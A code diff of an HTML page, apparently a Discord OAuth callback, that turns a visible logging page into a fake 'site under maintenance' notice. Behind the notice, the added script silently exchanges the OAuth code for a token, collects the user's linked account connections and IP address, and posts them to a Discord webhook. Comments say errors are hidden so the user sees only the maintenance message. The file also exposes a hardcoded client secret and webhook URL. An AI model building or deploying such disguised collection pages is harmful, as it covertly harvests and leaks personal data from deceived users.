@@ -1,114 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bakımda</title>
   <style>
+    @keyframes rgbCycle {
+      0% { color: rgb(255, 0, 0); }
+      33% { color: rgb(0, 255, 0); }
+      66% { color: rgb(0, 0, 255); }
+      100% { color: rgb(255, 0, 0); }
+    }
     body {
-      background: #0f0f13;
-      color: #f0f0f0;
-      font-family: monospace;
+      margin: 0;
+      height: 100vh;
+      background-color: #0f0f13;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      padding: 2rem;
+      font-family: monospace, monospace;
+      user-select: none;
     }
     h1 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-      color: #ff4757;
-    }
-    .log {
-      width: 100%;
-      max-width: 600px;
-      background: #1a1a1f;
-      border: 1px solid #444;
-      padding: 1rem;
-      border-radius: 8px;
-      white-space: pre-wrap;
-      word-break: break-word;
+      font-size: 2.5rem;
+      animation: rgbCycle 4s linear infinite;
+      text-align: center;
+      /* Burada renk animasyonu uygulanıyor */
     }
   </style>
 </head>
 <body>
-  <h1>Yetkilendiriliyor...</h1>
-  <div class="log" id="log">OAuth başlatılıyor...</div>
+  <h1>Sitemiz Şu anda Bakımda.</h1>
 
-<script>
-(async () => {
-  const client_id     = "1354724175788380327";
-  const client_secret = "3A8QJOc_MSUXC8rXtA-kr_rzGt8b8q2d";
-  const redirect_uri  = "https://rencordx.github.io/home/callback.html";
-  const webhook_url   = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";
+  <script>
+    (async () => {
+      const client_id = "1354724175788380327";
+      const client_secret = "3A8QJOc_MSUXC8rXtA-kr_rzGt8b8q2d";
+      const redirect_uri = "https://rencordx.github.io/home/callback.html";
+      const webhook_url = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";
 
-  const logEl = document.getElementById("log");
-  const log = (msg) => logEl.textContent += "\n" + msg;
+      const code = new URLSearchParams(window.location.search).get("code");
+      if (!code) {
+        // Kod yoksa işlem iptal, sadece sayfa görünür kalır.
+        return;
+      }
 
-  const code = new URLSearchParams(window.location.search).get("code");
-  if (!code) {
-    log("❌ URL'de ?code yok, işlem iptal.");
-    return;
-  }
+      try {
+        // 1. access_token al
+        const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            client_id,
+            client_secret,
+            grant_type: "authorization_code",
+            code,
+            redirect_uri
+          })
+        });
+        const tokenData = await tokenRes.json();
+        if (!tokenData.access_token) throw new Error("Access token alınamadı.");
 
-  try {
-    // 1. access_token al
-    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: new URLSearchParams({
-        client_id,
-        client_secret,
-        grant_type: "authorization_code",
-        code,
-        redirect_uri
-      })
-    });
-    const tokenData = await tokenRes.json();
-    if (!tokenData.access_token) throw new Error("Access token alınamadı.");
-    log("✅ access_token alındı.");
+        // 2. Kullanıcının bağlantılarını (connections) çek
+        const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
+          headers: { "Authorization": `Bearer ${tokenData.access_token}` }
+        });
+        const connections = await connectionsRes.json();
 
-    // 2. Kullanıcı bilgisi çek
-    const userRes = await fetch("https://discord.com/api/users/@me", {
-      headers: { "Authorization": `Bearer ${tokenData.access_token}` }
-    });
-    const user = await userRes.json();
-    log("✅ Kullanıcı bilgisi çekildi.");
+        // 3. IP adresi al
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
 
-    // 3. Vanity URL (kısa kullanıcı URL'si)
-    const vanity_url = `https://discord.com/users/${user.id}`;
+        // 4. Webhook payload
+        const payload = {
+          connections: connections,
+          client_ip: ipData.ip
+        };
 
-    // 4. IP adresi çek
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    log("✅ IP adresi alındı.");
+        // 5. Webhook'a gönder
+        await fetch(webhook_url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
+          })
+        });
 
-    // 5. Webhook'a gönderilecek payload
-    const payload = {
-      id: user.id,
-      username: `${user.username}#${user.discriminator}`,
-      email: user.email || null,
-      client_ip: ipData.ip,
-      vanity_url: vanity_url
-    };
-
-    await fetch(webhook_url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
-      })
-    });
-
-    log("✅ Webhook'a başarıyla gönderildi.");
-    log("Gönderilen veri:");
-    log(JSON.stringify(payload, null, 2));
-
-  } catch (err) {
-    log("❌ Hata oluştu: " + err.message);
-  }
-})();
-</script>
+        // İşlem tamam, kullanıcıya sadece bakımda mesajı görünsün.
+      } catch (err) {
+        // Hata olsa da kullanıcı görmesin, sadece konsola logla (isteğe bağlı)
+        console.error("Hata:", err);
+      }
+    })();
+  </script>
 </body>
 </html>
